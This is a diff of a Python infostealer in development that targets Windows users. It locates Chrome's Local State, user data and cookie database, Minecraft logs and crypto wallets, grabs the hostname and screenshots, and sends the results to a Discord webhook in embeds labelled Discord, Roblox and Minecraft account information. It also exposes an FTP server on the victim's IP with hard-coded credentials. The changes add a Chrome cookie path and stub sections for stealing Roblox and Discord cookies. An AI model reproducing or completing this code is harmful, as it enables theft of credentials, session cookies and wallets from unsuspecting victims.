@@ -19,7 +19,7 @@ from Cryptodome.Cipher import AES
 from pyftpdlib.authorizers import DummyAuthorizer
 from pyftpdlib.handlers import FTPHandler
 from pyftpdlib.servers import FTPServer
-from PIL import ImageGrab,Image
+from PIL import ImageGrab
 
 
 Webhook = ""
@@ -76,6 +76,7 @@ def fakeMessage():
 
 CHROME_PATH_LOCAL_STATE = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State"%(os.environ['USERPROFILE']))
 CHROME_PATH = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data"%(os.environ['USERPROFILE']))
+COOKIES_PATH = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Default\Network\Cookies"%(os.environ['USERPROFILE']))
 LatestLog_Path = os.path.normpath(os.path.join(os.getenv('USERPROFILE'), r'AppData\Roaming\.minecraft\logs\latest.log'))
 Wallets = []
 hostname = socket.gethostname()
@@ -155,6 +156,35 @@ def get_db_connection(chrome_path_login_db):
         print("%s"%str(e))
         print("[ERR] Chrome database cannot be found")
         return None
+    
+#region Rblx Cookies
+#endregion
+
+
+
+
+
+
+
+
+
+#region Discord Cookies
+#endregion
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+        
 
 def send_to_discord(webhook_url, content=None, embed=None, file_path=None):
     data = {}
@@ -262,7 +292,7 @@ if __name__ == '__main__':
             PCInfo.add_field(name="**:wireless: FTP Connection Login:**", value=f"IP:{ip_address}"+":21\n Username: SSIDSpin \n Password: Admin", inline=False)
             send_to_discord(Webhook, embed=PCInfo)
             DiscordInfo=discord.Embed(
-                title=f"[user'sdiscordname] Discord Information",
+                title=f"{hostname} Discord Information",
                 color= 0x5865F2
             )
             DiscordInfo.add_field(name="**:id: Discord ID:**", value="```Coming Soon```", inline=True)
@@ -282,7 +312,7 @@ if __name__ == '__main__':
             RobloxAccount.add_field(name="**:envelope_with_arrow: Roblox Email:**", value="```Coming Soon```", inline=True)
             RobloxAccount.add_field(name="**:moneybag: Robux:**", value="```Coming Soon```", inline=True)
             RobloxAccount.add_field(name="**:white_check_mark: Is Verified:**", value="```Coming Soon```", inline=True)
-            RobloxAccount.add_field(name="**:cookie: Roblox Cookie:**", value="```Coming Soon```", inline=False)
+            RobloxAccount.add_field(name="**:cookie: Roblox Cookie:**", value=f"```Coming Soon```", inline=False)
             send_to_discord(Webhook,embed=RobloxAccount)
 
             MCAccount=discord.Embed(
